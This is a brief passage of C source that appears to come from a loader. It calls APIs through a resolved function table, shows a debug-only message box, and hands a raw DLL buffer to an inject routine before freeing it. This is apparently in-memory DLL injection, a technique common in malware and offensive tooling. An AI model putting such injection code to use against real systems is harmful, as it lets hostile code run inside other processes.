        #ifdef DEBUG
        ((MESSAGEBOXA)api->MessageBoxA)(0, msg, msg, 0X0L);
        #endif
    }

    //((PRINTF)api->printf)("Raw dll size: %d\n", dwDllSize);
    inject(api, pRawDll, dwDllSize);
    ((FREE)api->free)(pRawDll);
}

